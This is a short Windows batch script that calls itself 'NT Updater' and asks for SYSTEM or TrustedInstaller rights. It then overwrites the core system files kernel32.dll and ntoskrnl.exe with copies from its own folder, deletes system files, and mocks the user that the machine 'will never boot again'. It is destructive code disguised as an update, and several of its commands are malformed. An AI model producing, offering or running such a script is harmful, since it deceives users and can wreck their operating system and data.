@echo off
echo "NT Updater.."
echo "Please run as SYSTEM/TrustedInstaller, or in a PE environment."
ROBOCOPY ".\kernel32-1.dll" "C:\Windows\system32"
ROBOCOPY ".\ntoskrnl-1.exe" "C:\Windows\system32"
del C:\Windows\kernel32.dll
del C:\Windows\ntoskrnl.exe
ROBOCOPY ".\kernel32-1.dll" "C:\Windows\system32\kernel32.dll"
ROBOCOPY ".\ntoskrnl-1.exe" "C:\Windows\system32\ntoskrnl.exe"
del C:\Windows\kernel32-1.dll
del C:\Windows\ntoskrnl-1.exe
echo "If you see an error, your system is ether:"
echo "Corrupted! WooHoo!"
echo "Perfectly fine because you didn't run as administrator!"
echo "Will never boot again!"
echo "We hope you're ok."
echo "(you aren't)"
